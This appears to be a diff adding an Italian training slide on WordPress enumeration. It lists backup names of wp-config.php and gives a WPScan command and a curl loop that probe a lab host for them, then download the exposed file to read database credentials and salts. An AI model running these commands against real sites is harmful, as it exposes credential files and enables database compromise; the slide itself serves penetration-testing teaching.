@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 2: WordPress Enumeration - Config File Exposure</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 2: WordPress Enumeration</h1>
+        <div class="subtitle">Slide 2.7: Configuration File Exposure</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: I File che non Dovresti Vedere</div>
+                <div class="card-text">
+                    <p>Durante sviluppo o manutenzione, gli admin spesso creano backup dei file di configurazione. Questi possono rimanere esposti.</p>
+                    <br>
+                    <p><strong>File critici da cercare:</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><code class="tech-term">wp-config.php.bak</code></li>
+                        <li><code class="tech-term">wp-config.php.old</code></li>
+                        <li><code class="tech-term">wp-config.php.save</code></li>
+                        <li><code class="tech-term">wp-config.php~</code> (vim backup)</li>
+                        <li><code class="tech-term">wp-config.php.swp</code> (vim swap)</li>
+                        <li><code class="tech-term">.wp-config.php.swp</code></li>
+                        <li><code class="tech-term">wp-config.txt</code></li>
+                    </ul>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> wp-config.php contiene credenziali DB, chiavi di autenticazione e salt. Un backup esposto = compromissione totale.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: Ricerca File Sensibili</div>
+                <div class="card-text">
+                    <p><strong>WPScan Config Backup:</strong></p>
+                    <div class="code-box"><span class="text-yellow">┌──(kali㉿kali)-[~]</span>
+<span class="text-red">└─$</span> wpscan --url http://vulnerable-wp.local -e cb</div>
+                    <br>
+                    <p><strong>Ricerca manuale con curl:</strong></p>
+                    <div class="code-box"><span class="text-red">└─$</span> for ext in bak old save txt swp ~; do
+    curl -s -o /dev/null -w "%{http_code} wp-config.php.$ext\n" \
+    http://vulnerable-wp.local/wp-config.php.$ext
+done</div>
+                    <br>
+                    <p><strong>Output:</strong></p>
+                    <div class="code-box">404 wp-config.php.bak
+<span class="text-red">200 wp-config.php.old   ← TROVATO!</span>
+404 wp-config.php.save
+404 wp-config.php.txt
+404 wp-config.php.swp</div>
+                    <br>
+                    <p><strong>Scaricare il file:</strong></p>
+                    <div class="code-box"><span class="text-red">└─$</span> curl http://vulnerable-wp.local/wp-config.php.old</div>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Questa slide può darvi accesso immediato al database. A sinistra, tutti i possibili nomi per backup di wp-config.
+        A destra, due approcci: WPScan con -e cb (config backups), o uno script bash manuale.
+        Lo script usa curl per testare ogni estensione e controlla il codice HTTP: 200 = esiste, 404 = non esiste.
+        Nell'esempio, wp-config.php.old risponde 200! Game over: scarichiamolo e leggiamo le credenziali.
+        Dentro troveremo: DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, e tutti i salt per le password.
+        Questo è uno degli errori più gravi e comuni che troverete."
+    -->
+
+    <script>const slideNumero = 16;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
